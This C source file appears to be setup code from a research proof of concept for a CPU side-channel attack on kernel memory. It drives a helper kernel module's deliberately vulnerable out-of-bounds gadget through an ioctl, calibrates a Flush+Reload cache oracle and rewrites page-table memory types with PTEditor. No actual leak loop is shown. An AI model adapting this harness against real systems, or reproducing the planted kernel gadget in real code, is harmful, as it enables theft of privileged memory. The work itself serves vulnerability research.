
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
#include <errno.h>

#include "lib.h"
#include "config.h"
#include "cacheutils.h"
#include "helper_lkm/gds_helper_lkm.h"
#include "../third_party/PTEditor/ptedit_header.h"

#define PAGE_SIZE 4096
#define CACHE_SIZE 64

extern uint64_t CACHE_THRESHOLD;
extern uint8_t *address_normal;
extern uint8_t *address_UC;
extern uint8_t *address_WC;
extern uint8_t *address_US;
extern uint8_t *oracles;
extern uint8_t *source;
extern uint8_t *dest;

extern void s_load_encode(uint32_t *perm);

int kernel_write_fd;
void setup_kernel_module()
{
    kernel_write_fd = open(GDS_HELPER_LKM_DEVICE_PATH, O_RDONLY);
    if (kernel_write_fd < 0)
    {
        printf("Error: Can't open device file: %s\n", GDS_HELPER_LKM_DEVICE_PATH);
        exit(1);
    }
}


void victim_kernel(unsigned long offset)
{
    struct gds_helper_lkm_params params;
#if KERNEL_GADGET_BUG 
    params.ulong1 = ADDRESS_BANNER - ADDRESS_SOURCE + offset;
    params.ulong2 = 64;
#elif KERNEL_GADGET_SAFEZ
    params.ulong1 = ADDRESS_BANNER - ADDRESS_SOURCE + offset;
    params.ulong2 = 64;
#elif KERNEL_GADGET_SAFE
    params.ulong1 = PAGE_SIZE + offset;
    params.ulong2 = -offset - 1;
#endif
    ioctl(kernel_write_fd, GDS_HELPER_LKM_IOCTL_OOB_GADGET, &params);
}

#define VICTIM_ROUTINE(offset) victim_kernel(offset);

void setup_oracle()
{
    printf("[+] Flush+Reload Threshold: ");
    CACHE_MISS = detect_flush_reload_threshold();
    printf("%lu\n", CACHE_MISS);
    for (int i = 0; i < 256; i++)
    {
        flush((uint8_t *)&oracles + i * PAGE_SIZE);
    }
}

void setup_pages()
{
    ptedit_init();

    int mt_type[] = {PTEDIT_MT_UC, PTEDIT_MT_WC, PTEDIT_MT_WT};
    int mt[sizeof(mt_type) / sizeof(int)];
    for (int i = 0; i < sizeof(mt) / sizeof(int); i++)
    {
        mt[i] = ptedit_find_first_mt(mt_type[i]);
        if (mt[i] == -1)
        {
            printf("MT not available!\n");
            exit(1);
        }
    }

    uint8_t *ptr = NULL;
    ptedit_entry_t entry;

    ptr = (uint8_t *)&address_normal;
    ptr[0] = ptr[0] + 1 - 1;

    ptr = (uint8_t *)&address_UC;
    ptr[0] = ptr[0] + 1 - 1;
    entry = ptedit_resolve(ptr, 0);
    entry.pte = ptedit_apply_mt(entry.pte, mt[0]);
    entry.valid = PTEDIT_VALID_MASK_PTE;
    ptedit_update(ptr, 0, &entry);

    ptr = (uint8_t *)&address_WC;
    ptr[0] = ptr[0] + 1 - 1;
    entry = ptedit_resolve(ptr, 0);
    entry.pte = ptedit_apply_mt(entry.pte, mt[1]);
    entry.valid = PTEDIT_VALID_MASK_PTE;
    ptedit_update(ptr, 0, &entry);

    ptedit_cleanup();
}

void setup_fh()
{
    signal(SIGSEGV, trycatch_segfault_handler);
    signal(SIGFPE, trycatch_segfault_handler);
}
